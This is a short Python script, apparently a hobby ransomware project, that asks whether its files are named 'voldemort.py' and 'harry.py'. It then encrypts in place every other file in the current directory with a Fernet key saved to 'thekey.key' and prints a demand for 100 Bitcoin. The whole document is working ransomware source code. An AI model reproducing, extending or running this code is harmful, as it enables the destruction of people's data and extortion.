#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import sys

# lets find some files

def ransomware_encrypt():
    
    answer1 = input("Is your encrypt file named 'voldemort.py'? (y/n)")

    if answer1 == "n" or answer1 == "N":
        print("Sorry, your encrypt file must be named 'voldemort.py'.")
        sys.exit()

    elif answer1 == "y" or answer1 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    answer2 = input("Is your decrypt file named 'harry.py'? (y/n)")

    if answer2 == "n" or answer2 == "N":
        print("Sorry, you must change the name of your decrypt file to 'harry.py'.")
        sys.exit()

    elif answer2 == "y" or answer2 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    files = []

    for file in os.listdir():
            if file == "voldemort.py" or file == "thekey.key" or file == "harry.py" or file == "test.py":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
            thekey.write(key)

    for file in files:
            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                    thefile.write(contents_encrypted)
    print("All of your files have been encrypted!! Send me 100 Bitcoin or i will delete your files in 24 hrs!")
